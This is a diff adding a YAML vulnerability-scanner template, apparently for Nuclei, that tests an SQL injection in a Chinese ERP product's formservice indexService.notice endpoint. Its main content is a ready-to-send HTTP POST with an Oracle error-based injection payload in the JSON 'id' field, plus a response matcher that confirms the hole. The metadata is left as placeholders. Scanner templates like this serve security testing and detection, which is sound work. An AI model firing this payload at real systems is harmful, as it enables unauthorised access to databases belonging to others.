@@ -1,0 +1,28 @@
+id: shikongzhiyou-erp-formservice-indexService-sqli
+
+info:
+  name: Template Name
+  author: wangzong
+  severity: high
+  description: description
+  reference:
+    - https://
+  tags: tags
+
+http:
+  - raw:
+      - |-
+        POST /formservice?service=indexService.notice HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
+        Accept-Encoding: gzip, deflate
+        Connection: close
+        Content-Type: application/json
+        Content-Length: 214
+
+        {"id":"1' AND 6448=CTXSYS.DRITHSX.SN(6448,(CHR(113)||CHR(122)||CHR(112)||CHR(118)||CHR(113)||(SELECT (CASE WHEN (6448=6448) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(122)||CHR(118)||CHR(118)||CHR(113)))-- fKEk"}
+    matchers:
+      - type: word
+        part: body
+        words:
+          - qzpvq
